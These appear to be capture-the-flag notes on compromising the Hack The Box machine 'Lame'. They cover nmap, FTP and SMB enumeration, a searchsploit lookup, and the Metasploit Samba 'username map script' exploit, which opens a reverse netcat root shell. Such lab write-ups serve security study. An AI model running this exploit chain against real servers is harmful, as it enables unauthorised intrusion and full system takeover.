#linux 
# Enumeration
## Nmap

```
nmap -sC -sV -Pn lame.htb
Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-01 23:34 EST
Nmap scan report for lame.htb (10.129.219.210)
Host is up (0.19s latency).
Not shown: 996 filtered tcp ports (no-response)
PORT    STATE SERVICE     VERSION
21/tcp  open  ftp         vsftpd 2.3.4
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 10.10.14.39
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      vsFTPd 2.3.4 - secure, fast, stable
|_End of status
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
22/tcp  open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
| ssh-hostkey: 
|   1024 600fcfe1c05f6a74d69024fac4d56ccd (DSA)
|_  2048 5656240f211ddea72bae61b1243de8f3 (RSA)
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 3.0.20-Debian (workgroup: WORKGROUP)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: 2h30m24s, deviation: 3h32m11s, median: 21s
|_smb2-time: Protocol negotiation failed (SMB2)
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb-os-discovery: 
|   OS: Unix (Samba 3.0.20-Debian)
|   Computer name: lame
|   NetBIOS computer name: 
|   Domain name: hackthebox.gr
|   FQDN: lame.hackthebox.gr
|_  System time: 2023-03-01T23:35:05-05:00

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 65.12 seconds
                                                                 
```

FTP: anonymous login
SAMBA: try to login?

## FTP port 21
### login
```
ftp lame.htb
Connected to lame.htb.
220 (vsFTPd 2.3.4)
Name (lame.htb:kali): anonymous
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> 
```


## SAMBA port 445

### Crackmapexec
```
crackmapexec smb lame.htb
/usr/lib/python3/dist-packages/pywerview/requester.py:144: SyntaxWarning: "is not" with a literal. Did you mean "!="?
  if result['type'] is not 'searchResEntry':
SMB         lame.htb        445    LAME             [*] Unix (name:LAME) (domain:hackthebox.gr) (signing:False) (SMBv1:True)
```

### SMBmap
```
 smbmap -H lame.htb  
[+] IP: lame.htb:445    Name: unknown                                           
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        print$                                                  NO ACCESS       Printer Drivers
        tmp                                                     READ, WRITE     oh noes!
        opt                                                     NO ACCESS
        IPC$                                                    NO ACCESS       IPC Service (lame server (Samba 3.0.20-Debian))
        ADMIN$                                                  NO ACCESS       IPC Service (lame server (Samba 3.0.20-Debian))
```

(lame server (Samba 3.0.20-Debian)) tells me to lookup 3.0.20 in searchsplit?

## Searchsploit
```
 searchsploit samba 3.0.20                                                      
----------------------------------------------------------------- ---------------------------------
 Exploit Title                                                   |  Path
----------------------------------------------------------------- ---------------------------------
Samba 3.0.10 < 3.3.5 - Format String / Security Bypass           | multiple/remote/10095.txt
Samba 3.0.20 < 3.0.25rc3 - 'Username' map script' Command Execut | unix/remote/16320.rb
Samba < 3.0.20 - Remote Heap Overflow                            | linux/remote/7701.txt
Samba < 3.6.2 (x86) - Denial of Service (PoC)                    | linux_x86/dos/36741.py
----------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

16320.rb looks interesting 

# Foothold
## Metasploit

```
msf6 > search samba 3.0.20

Matching Modules
================

   #  Name                                Disclosure Date  Rank       Check  Description
   -  ----                                ---------------  ----       -----  -----------
   0  exploit/multi/samba/usermap_script  2007-05-14       excellent  No     Samba "username map script" Command Execution


Interact with a module by name or index. For example info 0, use 0 or use exploit/multi/samba/usermap_script

msf6 > use 0
[*] No payload configured, defaulting to cmd/unix/reverse_netcat
msf6 exploit(multi/samba/usermap_script) >
```

Set Rhosts and Lhost and run it.


## Root
```
msf6 exploit(multi/samba/usermap_script) > run

[*] Started reverse TCP handler on 10.10.14.39:4444 
[*] Command shell session 2 opened (10.10.14.39:4444 -> 10.129.219.210:46488) at 2023-03-01 23:57:08 -0500

whoami
root

```

## User flag
```
cd /home/makis
ls
user.txt
```

## Root flag
```
cd /home/makis
ls
user.txt
cd /root
ls
Desktop
reset_logs.sh
root.txt
vnc.log
```

done???
